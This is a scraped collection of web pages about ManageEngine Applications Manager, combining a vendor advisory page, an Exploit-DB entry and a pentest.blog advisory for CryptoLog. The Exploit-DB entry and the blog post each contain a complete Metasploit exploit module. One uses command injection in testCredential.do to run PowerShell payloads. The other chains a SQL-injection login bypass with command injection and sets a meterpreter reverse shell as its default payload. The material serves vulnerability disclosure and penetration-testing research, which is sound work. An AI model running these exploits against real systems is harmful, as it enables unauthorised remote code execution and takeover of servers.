To receive security advisories for Applications Manager, subscribe [here.](https://www.manageengine.com/security/subscribe/)

| CVE | Synopsis | Severity | Milestone |
| --- | --- | --- | --- |

## Loved by customers all over the world

![Gartner Peer Insights](../images/footer/client-logo/gartner-peer-insights.svg)
#### "Standout Tool With Extensive Monitoring Capabilities"

‚òÖ
‚òÖ
‚òÖ
‚òÖ
‚òÖ

It allows us to track crucial metrics such as response times, resource utilization, error rates, and transaction performance. The real-time monitoring alerts promptly notify us of any issues or anomalies, enabling us to take immediate action.

Reviewer Role: Research and Development

[![](../images/footer/client/carlos-rivero.webp)](https://www.youtube.com/watch?v=d7Wbd6cUImY&t=1s)
##### "I like Applications Manager because it helps us to detect issues present in our servers and SQL databases."

###### Carlos Rivero

Tech Support Manager, Lexmark

##### Trusted by over 6000+ businesses globally

* [Download](../download.html?btmMenu "Download ManageEngine Applications Manager")
* [Live Demo](http://demo.appmanager.com/jsp/SingleSignOn.jsp?clienttype2=html&username=demo&password=demo&demolanguage=EN)
* [Compare Editions](../applications-manager-comparison.html?btmMenu)
* [Buy Now](https://store.manageengine.com/applications_manager/)
* [Pricing](https://www.manageengine.com/products/applications_manager/pricing.html?btmMenu)

* [Download](https://www.manageengine.com/products/applications_manager/download.html?utm_source=btmMenuapm "Download ManageEngine Applications Manager")
* [Request Demo](https://www.manageengine.com/products/applications_manager/get-quote.html?utm_source=btmMenuapm "Demo - ManageEngine Applications Manager")
* [Get Quote](https://www.manageengine.com/products/applications_manager/demo.html?utm_source=btmMenuapm "Get Quote ManageEngine Applications Manager")

[#### The ultimate APM playbook: Master challenges, implement best practices

Download e-book

![The ultimate APM playbook](../images/popup-banner/pop-promotion-img.webp)](https://www.manageengine.com/products/applications_manager/overcoming-roadblocks-and-mastering-best-practices-in-apm.html?apm-popup-banner)



=== Content from www.exploit-db.com_a8f0e5fd_20250124_230052.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# ManageEngine Applications Manager 13.5 - Remote Code Execution (Metasploit)

#### EDB-ID:

###### 44274

#### CVE:

###### [2018-7890](https://nvd.nist.gov/vuln/detail/CVE-2018-7890)

---

**EDB Verified:**

#### Author:

###### [Mehmet Ince](/?author=671)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Java](/?platform=java)

#### Date:

###### 2018-03-12

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine Applications Manager Remote Code Execution",
      'Description'    => %q{
        This module exploits command injection vulnerability in the ManageEngine Application Manager product.
        An unauthenticated user can execute a operating system command under the context of privileged user.

        Publicly accessible testCredential.do endpoint takes multiple user inputs and validates supplied credentials
        by accessing given system. This endpoint calls a several internal classes and then executes powershell script
        without validating user supplied parameter when the given system is OfficeSharePointServer.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module
        ],
      'References'     =>
        [
          ['CVE', '2018-7890'],
          ['URL', 'https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/']
        ],
      'DefaultOptions'  =>
        {
          'WfsDelay' => 10,
          'RPORT' => 9090
        },
      'Payload' =>
        {
          'BadChars' => "\x22"
        },
      'Platform'       => ['win'],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'Targets'         => [ ['Automatic', {}] ],
      'Privileged'     => true,
      'DisclosureDate' => 'Mar 7 2018',
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the application', '/'])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'testCredential.do'),
      'vars_post' => {
        'method' => 'testCredentialForConfMonitors',
        'type' => 'OfficeSharePointServer',
        'montype' => 'OfficeSharePointServer',
        'isAgentEnabled' => 'NO',
        'isAgentAssociated' => 'false',
        'displayname' => Rex::Text.rand_text_alpha(10),
        'HostName' => '127.0.0.1', # Try to access random IP address or domain may trigger SIEMs or DLP systems...
        'Version' => '2013',
        'Powershell' => 'True', # :-)
        'CredSSP' => 'False',
        'SPType' => 'SPServer',
        'CredentialDetails' => 'nocm',
        'Password' => Rex::Text.rand_text_alpha(3),
        'UserName' => Rex::Text.rand_text_alpha(3)
      }
    })
    if res && res.body.include?('Kindly check the credentials and try again')
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit

    powershell_options = {
      encode_final_payload: true,
      remove_comspec: true
    }
    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)

    print_status('Triggering the vulnerability')

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'testCredential.do'),
      'vars_post' => {
        'method' => 'testCredentialForConfMonitors',
        'type' => 'OfficeSharePointServer',
        'montype' => 'OfficeSharePointServer',
        'isAgentEnabled' => 'NO',
        'isAgentAssociated' => 'false',
        'displayname' => Rex::Text.rand_text_alpha(10),
        'HostName' => '127.0.0.1', # Try to access random IP address or domain may trigger SIEMs or DLP systems...
        'Version' => '2013',
        'Powershell' => 'True', # :-)
        'CredSSP' => 'False',
        'SPType' => 'SPServer',
        'CredentialDetails' => 'nocm',
        'Password' => Rex::Text.rand_text_alpha(3),
        'UserName' => "$(#{p})"
      }
    })

  end
end

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

¬©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

√ó

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as ‚ÄúGoogle Hacking‚Äù was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny‚Äôs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term ‚ÄúGoogledork‚Äù to refer
to ‚Äúa foolish or inept person as revealed by Google‚Äú. This was meant to draw attention to
the fact that this was not a ‚ÄúGoogle problem‚Äù but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term ‚Äúdork‚Äù became shorthand for a search query that located sensitive
information and ‚Äúdorks‚Äù were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

√ó

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

√ó

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from pitstop.manageengine.com_ca8b041a_20250124_230050.html ===



=== Content from pentest.blog_6b2cb6e5_20250126_041728.html ===

[Skip to main content](#content)
[![Pentest Blog](https://pentest.blog/wp-content/uploads/pentestblog-color-e1508706802866.png)](https://pentest.blog/)

Toggle navigation

* [Advisories](https://pentest.blog/category/advisories/)
* [Operating System](https://pentest.blog/category/operating-system/)
* [Application Security](https://pentest.blog/category/application-security/)
* [Network](https://pentest.blog/category/network/)
* [Tools](https://pentest.blog/category/tools/)
* [Article Series](https://pentest.blog/article-series/)
* [About Us](https://pentest.blog/about-us/)

![](https://pentest.blog/wp-content/uploads/prodaft_2-750x350.jpeg)
# Advisory | Cryptolog Unauthenticated Remote Code Execution

 [May 3, 2017May 3, 2017](https://pentest.blog/advisory-cryptolog-unauthenticated-remote-code-execution/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Advisories](https://pentest.blog/category/advisories/)

CRYPTOLOG is a log manager that collects, normalizes, and categorizes massive logs generated across your network and turn it into valuable information on an intuitive interface where advance search, analysis and correlation monitoring becomes easier and more efficient.

### Advisory Informations

**Remotely Exploitable:** Yes

**Authentication Required:**¬†NO

**Versions Affected:** <=¬†2017

**Technology:** PHP

**Vendor URL:** https://www.crypttech.com/en/products/product-detail/CryptoLOG/65/0/0

**CVSSv3¬†Score:** 10.0 (/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Date of found:** 5¬†Apr 2017

### Technical Details

During the investigation, we‚Äôve found two different vulnerability.

#### Unauthenticated SQL Injection

Following code piece is taken from login.php file.

```
$user=$_POST['user'];
$pass=$_POST['pass'];
if($_GET['act']=='logout'){
session_unset();
$contenttowrite = $contenttowrite.'<tr><td colspan="2">√áƒ±kƒ±≈ü yaptƒ±nƒ±z!</td></tr>';

}else if($_GET['act']=='login'){
  $link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
  if (!$link) die ("Out of service");
  mysql_select_db(DB_DATABASE, $link) or die ("Out of service");
  $queryusercheck = mysql_query("SELECT count(id) FROM cc_users WHERE USERNAME='$user' AND `PASSWORD`='".computeHash($user, $pass)."'",$link);
  $usercheck_value = mysql_fetch_array ($queryusercheck);
```

Obviously, there is sql injection vulnerability that can lead to login bypass.

#### Authenticated Command Injection

Following code piece is taken from

```
<?php
include("config.php");
require_once("kontrol.php");
$opt=$_POST['opt'];
$lsid=$_POST['lsid'];
$sharetype=$_POST['lssharetype'];
$remoteaddress=$_POST['lsremoteaddress'];
$sharefolder=$_POST['lssharefolder'];
$user=$_POST['lsuser'];
$pass=$_POST['lspass'];
$domain=$_POST['lsdomain'];
$dbConn = mysql_connect(DB_HOST, DB_USER, DB_PASS);
if (!$dbConn) die ("Out of service");
mysql_select_db(DB_DATABASE, $dbConn) or die ("Out of service");

include("classes/logshares_class.php");

if($opt=='del')
{
  cLogshares::fDeleteFileshareDB($dbConn,$lsid);
}
else if($opt=='add')
{
  cLogshares::fAddFileshareDB($dbConn,$sharetype,$remoteaddress,$sharefolder,$user,$pass,$domain);
}
else if($opt=='check')
{
  echo cLogshares::fTestFileshare("/mnt/logsource_".$lsid."_".$sharetype);
}
else if($opt=='mount')
{
  cLogshares::fMountFileshareOnly($dbConn,$lsid,$sharetype);
  echo cLogshares::fTestFileshare("/mnt/logsource_".$lsid."_".$sharetype);
}
?>

```

`$sharetype` parameter is populated by using user supplied data. And then it used at inside of¬†function parameter for `fTestFileshare()`. Here is the relavent function definition.

```
function fTestFileshare($sharefolder)
{
  $output = shell_exec('sudo /opt/cryptolog/scripts/testmountpoint.sh '.$sharefolder);
  return trim($output);
}
```

Plus, the command is executed with root privileges because of `sudo` usage.

### Exploitation & Metasploit Module

We successfully exploited both vulnerability. By exploiting sql injection flaw on login page, we‚Äôre retrieving a valid cookie value and then abusing¬†command injection issue gives us a root privileges shell.

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "CryptoLOG Remote Code Execution",
      'Description'    => %q{
        This module exploits the sql injection and command injection vulnerability of CryptoLog. An un-authenticated user can execute a
        terminal command under the context of the web user.

        login.php endpoint is responsible for login process. One of the user supplied parameter is used by the application without input validation
        and parameter binding. Which cause a sql injection vulnerability. Successfully exploitation of this vulnerability gives us the valid session.

        logshares_ajax.php endpoint is repsonsible for executing a operation system command. It's not possible to access this endpoint without having
        a valid session. One user parameter is used by the application while executing operating system command which cause a command injection issue.

        Combining these vulnerabilities gives us opportunity execute operation system command under the context of the web user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Mehmet Ince <[[email¬†protected]](/cdn-cgi/l/email-protection)>' # author & msf module
        ],
      'References'     =>
        [
          ['URL', 'https://pentest.blog/advisory-cryptolog-unauthenticated-remote-code-execution/']
        ],
      'DefaultOptions'  =>
        {
          'Payload'  => 'python/meterpreter/reverse_tcp'
        },
      'Platform'       => ['python'],
      'Arch'           => ARCH_PYTHON,
      'Targets'        => [[ 'Automatic', { }]],
      'Privileged'     => false,
      'DisclosureDate' => "May 3 2017",
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The URI of the vulnerable CryptoLog instance', '/'])
      ], self.class)
  end

  def check
    r = rand_text_alpha(15)
    i = rand_text_numeric(5)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'cryptolog', 'login.php'),
      'vars_get' => {
        'act' => 'login'
      },
        'vars_post' => {
        'user' => "#{r}' OR #{i}=#{i}-- #{r}",
        'pass' => "#{r}"
      }
    })

    if res && res.code == 302 && res.headers.include?('Set-Cookie')
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("Bypassing login by exploiting SQLi flaw")

    r = rand_text_alpha(15)
    i = rand_text_numeric(5)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'cryptolog', 'login.php'),
      'vars_get' => {
        'act' => 'login'
      },
      'vars_post' => {
        'user' => "#{r}' OR #{i}=#{i}-- #{r}",
        'pass' => "#{r}"
      }
    })

    if res && res.code == 302 && res.headers.include?('Set-Cookie')
      cookie = res.get_cookies
      print_good("Successfully logged in")
    else
      fail_with(Failure::Unknown, "Something went wrong.")
    end

    print_status("Exploiting command injection flaw")

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'cryptolog', 'logshares_ajax.php'),
      'cookie'    => cookie,
      'vars_post' => {
        'opt' => "check",
        'lsid' => "$(python -c \"#{payload.encoded}\")",
        'lssharetype' => "#{r}"
      }
    })

  end
end
```

You can¬†see development process at following PR¬†<https://github.com/rapid7/metasploit-framework/pull/8331>

### Timeline

5 April 2017¬†‚Äì Vulnerability found during penetration testing.

5 April 2017 ¬†‚Äì¬†First contact with vendor. All information (including msf module) is shared.

5 April 2017 ¬†‚Äì Response from vendor. ¬†‚ÄúYou should be working on 9 years old version.‚Äù

5 April 2017 ¬†‚Äì¬†We¬†requested to share the latest version with us.

13 April 2017 ‚Äì No response till this date. We fired a second email for assistance.

15 April 2017 ‚Äì We shared the communication issue of vendor¬†with our customer. Our customer¬†requested the upgrade from vendor.

25¬†April 2017 ‚Äì Upgrade to the latest version is completed on our client¬†side. According to the information given from vendor, our client was using¬†2015 version.

02¬†May 2017 ‚Äì We tried same metasploit modules against latest version and it just worked. No matter how hard we try, still not receiving any response from vendor.

03 May 2017 ‚Äì ¬†Advisory release.

[0day](https://pentest.blog/tag/0day/)

![](https://secure.gravatar.com/avatar/a02c8481b3d29584e05195893e584b61?s=60&d=monsterid&r=g)

#### [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)

Master Ninja @ Prodaft / INVICTUS Europe.

## Post navigation

 [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/)[Unexpected Journey #5 ‚Äì From weak password to RCE on Symantec Messaging Gateway (CVE-2017-6326)](https://pentest.blog/unexpected-journey-5-from-weak-password-to-rce-on-symantec-messaging-gateway/)

Search for:

### PRODAFT Cyber Intelligence and Cyber Security Services

[![](https://pentest.blog/wp-content/uploads/Mg6EYwIk_400x400.jpg)](https://www.invictuseurope.com/)

### Recent Posts

* [Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution](https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/)
* [Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137](https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/)
* [Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution](https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/)
* [LiderAhenk 0day ‚Äì All your PARDUS Clients Belongs To Me (CVE-2021-3825)](https://pentest.blog/liderahenk-0day-all-your-pardus-clients-belongs-to-me/)
* [Pardus 21 Linux Distro ‚Äì Remote Code Execution 0day 2021 CVE-2021-3806](https://pentest.blog/pardus-21-linux-distro-remote-code-execution-0day-2021/)
### Latest Comments

* [Ege Balci](https://github.com/EgeBalci) on [Art of Anti Detection 3 ‚Äì Shellcode Alchemy](https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/#comment-1244)
* Chase Run Taylor on [Art of Anti Detection 1 ‚Äì Introduction to AV & Detection Techniques](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242)
* 0x00 on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240)
### Tags

[0day](https://pentest.blog/tag/0day/)
[1day](https://pentest.blog/tag/1day/)
[advisory](https://pentest.blog/tag/advisory/)
[alienvault](https://pentest.blog/tag/alienvault/)
[android](https://pentest.blog/tag/android/)
[application](https://pentest.blog/tag/application/)
[assembly](https://pentest.blog/tag/assembly/)
[bof](https://pentest.blog/tag/bof/)
[burp](https://pentest.blog/tag/burp/)
[bypass](https://pentest.blog/tag/bypass/)
[crypter](https://pentest.blog/tag/crypter/)
[decoder](https://pentest.blog/tag/decoder/)
[dns](https://pentest.blog/tag/dns/)
[EMET](https://pentest.blog/tag/emet/)
[encoder](https://pentest.blog/tag/encoder/)
[exploit](https://pentest.blog/tag/exploit/)
[hook](https://pentest.blog/tag/hook/)
[iat](https://pentest.blog/tag/iat/)
[icmp](https://pentest.blog/tag/icmp/)
[in-memory](https://pentest.blog/tag/in-memory/)
[IOT](https://pentest.blog/tag/iot/)
[linux](https://pentest.blog/tag/linux/)
[malware](https://pentest.blog/tag/malware/)
[metasploit](https://pentest.blog/tag/metasploit/)
[multi-stage](https://pentest.blog/tag/multi-stage/)
[nas](https://pentest.blog/tag/nas/)
[packer](https://pentest.blog/tag/packer/)
[php](https://pentest.blog/tag/php/)
[ransomware](https://pentest.blog/tag/ransomware/)
[rce](https://pentest.blog/tag/rce/)
[reflective](https://pentest.blog/tag/reflective/)
[research](https://pentest.blog/tag/research/)
[reverse](https://pentest.blog/tag/reverse/)
[reversing](https://pentest.blog/tag/reversing/)
[secure coding](https://pentest.blog/tag/secure-coding/)
[securityonion](https://pentest.blog/tag/securityonion/)
[self-defence](https://pentest.blog/tag/self-defence/)
[shellcode](https://pentest.blog/tag/shellcode/)
[siem](https://pentest.blog/tag/siem/)
[sql injection](https://pentest.blog/tag/sql-injection/)
[sqlmap](https://pentest.blog/tag/sqlmap/)
[stager](https://pentest.blog/tag/stager/)
[storage](https://pentest.blog/tag/storage/)
[tunneling](https://pentest.blog/tag/tunneling/)
[windows](https://pentest.blog/tag/windows/)
### Awarded Top 15 Pentest Blog

[![Pentest Blogs](/wp-content/uploads/pentest_1000px.png)](https://blog.feedspot.com/pentest_blogs/ "Pentest Blogs")

INVICTUS Cyber Security & Intelligence Services | Theme by [Colorlib](http://colorlib.com/) Powered by [WordPress](http://wordpress.org/)



=== Content from www.manageengine.com_03bb00a5_20250126_041728.html ===


[Schedule demo](https://www.manageengine.com/products/applications_manager/demo.html?demorhsFixed)

 [![Application Performance Monitoring - ManageEngine Applications Manager](../../images/logo/applicationsmanager.svg "Application Performance Monitoring - ManageEngine Applications Manager")](../applications_manager/)
[Download](download.html "Download ManageEngine Applications Manager")

* [Overview](../applications_manager/)
* [Features](applications-monitoring-features.html)
* [Demo](demo.html)
* [Get Quote](get-quote.html)
* [Editions](applications-manager-comparison.html)
* [Resources](document.html)
  + [What's New](https://www.manageengine.com/products/applications_manager/document.html#whatsnew)
  + [Product Info](https://www.manageengine.com/products/applications_manager/document.html#productinfo)
  + [Blog / Articles](https://www.manageengine.com/products/applications_manager/document.html#blog-articles)
  + [White Papers / e-book](https://www.manageengine.com/products/applications_manager/document.html#whitepaper-ebook)
  + [Video](https://www.manageengine.com/products/applications_manager/document.html#video)
  + [Tech Topics](https://www.manageengine.com/products/applications_manager/document.html#techtopics)
* [Customers](customer.html)
* [Support](support.html)

We are here to help!

[Home](../applications_manager/) ¬ª Support Resources

* [Technical Support](https://www.manageengine.com/products/applications_manager/request-support.html)

  [Receive technical support

  from APM experts.](https://www.manageengine.com/products/applications_manager/request-support.html)
* [Service Packs](service-packs.html)
   [Applications Manager](https://www.manageengine.com/products/applications_manager/service-packs.html) | [EUM Agent](https://www.manageengine.com/products/applications_manager/eum-service-packs.html) | [RUM Agent](https://www.manageengine.com/products/applications_manager/rum-service-packs.html)

  [Find out what's new](https://www.manageengine.com/products/applications_manager/release-notes.html)
* [Troubleshooting Tips](https://pitstop.manageengine.com/portal/kb/applications-manager)

  [Solutions for common problems.](https://pitstop.manageengine.com/portal/kb/applications-manager)

   [General FAQ](https://pitstop.manageengine.com/portal/kb/applications-manager/faq/general-faqs) | [Installation FAQ](https://pitstop.manageengine.com/portal/kb/applications-manager/faq/installation-and-startup/general) | [Licensing FAQ](https://pitstop.manageengine.com/portal/kb/articles/licensing-faq)
* [Add-ons](https://www.manageengine.com/products/applications_manager/download-addons.html)

  [Download

  Applications Manager

  add-ons.](https://www.manageengine.com/products/applications_manager/download-addons.html)
* Archived builds

  Select
  174300
  174200
  174100
  173303
  173302
  173301
  173300
  173200
  173100
  173000
  172900
  172800
  172700
  172600
  172500
  172400
  172300
  172200
  172100
  172000
  171900
  171800
  171700
  171600
  171500
  171400
  171300
  171200
  171100
  171000
  170900
  170800
  170700
  170600
  170500
  170400
  170300
  170200
  170100
  170008
  170007
  170006
  170005
  170004
  170003
  170002
  170001
  170000
  16846
  16845
  16844
  16843
  16842
  16841
  16840
  16830
  16820
  16810
  16800
